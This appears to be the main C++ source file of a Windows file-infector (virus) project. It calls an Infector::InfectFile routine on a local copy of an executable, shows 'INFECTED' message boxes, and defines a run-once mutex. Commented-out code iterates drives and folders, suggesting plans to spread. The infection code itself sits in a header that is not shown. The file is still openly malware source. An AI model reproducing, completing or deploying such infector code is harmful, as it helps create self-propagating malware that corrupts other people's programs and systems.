#include <Windows.h>

#include "FileSystem/FileSystem.h"
#include "Infector.h"

/*
void IterateDrivesFunction(const wchar_t* drivePath, FileSystem::Drives::DriveType driveType)
{
    wprintf(L"%s\n", drivePath);
}

bool IterateFolderFunction(const wchar_t* folder)
{
    wprintf(L"folder %s\n", folder);
    return false;
}

void IterateFileFunction(const wchar_t* file)
{
    wprintf(L"file %s\n", file);
}
*/

//FileSystem::Drives::IterateDrives(IterateDrivesFunction);

//FileSystem::Files::IteratePath(L"C:\\Users\\Yoav\\Desktop\\Tools\\MyDevelopments\\CustomStd\\CustomStd", IterateFileFunction, IterateFolderFunction);


#define IS_RUNNING_MUTEXT_NAME L"INFECTORJUMPER"


int main()
{
    MessageBoxA(0, "", "INFECTED", 0);

    bool succeed = Infector::InfectFile(L"C:\\Users\\Yoav\\Desktop\\YoavTools\\_shared\\FileInfector\\x64\\Release\\MessageBox - Copy.exe");

    if (succeed)
    {
        MessageBoxA(0, "", "INFECTED2", 0);
    }

    return 0;

}